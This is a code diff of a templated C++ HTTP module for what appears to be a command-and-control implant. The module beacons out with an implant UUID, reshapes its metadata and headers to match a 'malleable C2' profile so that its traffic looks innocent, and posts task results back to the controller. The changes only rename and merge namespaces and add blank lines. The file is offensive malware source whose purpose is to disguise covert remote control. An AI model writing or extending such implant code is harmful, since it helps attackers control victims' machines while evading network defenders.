@@ -35,7 +35,7 @@ using namespace std::string_literals;
 #include "core/settings.h"
 #include "data/transforms/transforms.h"
 
-namespace [[ http_get_function_name ]] {
+namespace [[ http_function_name ]] {
     inline std::vector <uint8_t> get(std::vector<uint8_t> metadata_as_msgpack) {
         std::string http_response_buffer;
 
@@ -54,7 +54,9 @@ namespace [[ http_get_function_name ]] {
         // --- MetaData Transforms ---
         //Transform metadata before it goes out to match the malleablec2 profile
         [%- for transform in http_get_client_metadata_transforms_list %]
+        
         [[ render_transform(transform, 'metadata') ]]
+        
         [%- endfor %]
         // --- End MetaData Transforms ---
 
@@ -102,7 +104,9 @@ namespace [[ http_get_function_name ]] {
 
         // --- Add addtl headers/params as specified in mc2 b4 sending off. ---
         [%- for header_or_param in http_get_client_headers_or_parameters_list %]
+        
         [[ render_add_headers_or_parameters(header_or_param) ]]
+        
         [%- endfor %]
         // --- end --- 
 
@@ -129,10 +133,6 @@ namespace [[ http_get_function_name ]] {
         }
     }
 
-
-}
-
-namespace [[ http_post_function_name ]] {
     inline int post(std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list) {
         //turn into a string container becuase reasons that I don't remeebr atm
         std::string payload(task_response_msgpack_list.begin(), task_response_msgpack_list.end());
@@ -245,3 +245,5 @@ namespace [[ http_post_function_name ]] {
         return 0;
     }
 }
+
+
